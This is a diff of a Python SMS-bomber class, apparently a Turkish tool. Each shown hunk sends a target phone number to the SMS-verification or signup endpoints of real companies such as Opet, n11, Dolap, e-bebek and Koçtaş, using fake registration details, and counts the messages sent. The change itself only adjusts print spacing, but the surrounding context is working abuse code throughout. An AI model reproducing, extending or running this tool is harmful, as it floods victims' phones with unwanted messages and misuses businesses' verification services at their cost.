+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1027,7 +1027,7 @@ class SendSms():
                 try:
                     r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={numara}&api_key=GetDocuments%0A", verify=False)
                     if (r.json()["success"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1053,7 +1053,7 @@ class SendSms():
                     json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(numara), "opetKvkkAndEtk": True, "plate": "31ABC31"}
                     r = requests.post(url, json=json)
                     if (r.status_code) == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1081,7 +1081,7 @@ class SendSms():
                     json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
                     r = requests.put(url, headers=headers, json=json)
                     if r.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1107,7 +1107,7 @@ class SendSms():
                     headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                     r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}", headers=headers)
                     if (r.json()["IsSuccess"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1135,7 +1135,7 @@ class SendSms():
                     json={"cep_tel": numara, "cep_tel_ulkekod": "90"}
                     r = requests.post(url, headers=headers, json=json)
                     if (r.json()["kod"]) == "0000":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1163,7 +1163,7 @@ class SendSms():
                     json={"cep_tel": numara, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
                     r = requests.post(url, headers=headers, json=json)
                     if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.isbike.istanbul "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.isbike.istanbul "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1191,7 +1191,7 @@ class SendSms():
                     json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
                     r = requests.post(url, headers=headers, json=json)
                     if (r.json()["isSuccess"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1219,7 +1219,7 @@ class SendSms():
                     data = {"phone": numara}
                     r = requests.post(url, headers=headers, data=data)
                     if (r.json()["success"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1249,7 +1249,7 @@ class SendSms():
                     json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                     r = requests.post(url, headers=headers, json=json)
                     if r.json()["status"] == "SUCCESS":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1275,7 +1275,7 @@ class SendSms():
                     json={"gsm": numara}
                     r = requests.post(url, json=json)
                     if (r.json()["status"]) == 1 :
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1302,7 +1302,7 @@ class SendSms():
                     json={"country_code": "90", "phone": numara}
                     r = requests.post(url, json=json)
                     if (r.json()["success"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1330,7 +1330,7 @@ class SendSms():
                     data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                     r = requests.post(url, headers=headers, data=data)
                     if (r.status_code) == 202:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1355,7 +1355,7 @@ class SendSms():
                 try:
                     r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
                     if r.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1383,7 +1383,7 @@ class SendSms():
                     data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                     r = requests.post(url, headers=headers, data=data)      
                     if r.status_code == 202:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1410,7 +1410,7 @@ class SendSms():
                     data = {"givePermission": "true", "mobileNumber": numara}
                     r = requests.post(url, data=data)
                     if (r.json()["status"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1439,7 +1439,7 @@ class SendSms():
                     json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                     r = requests.post(url, headers=headers, json=json)
                     if (r.status_code) == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
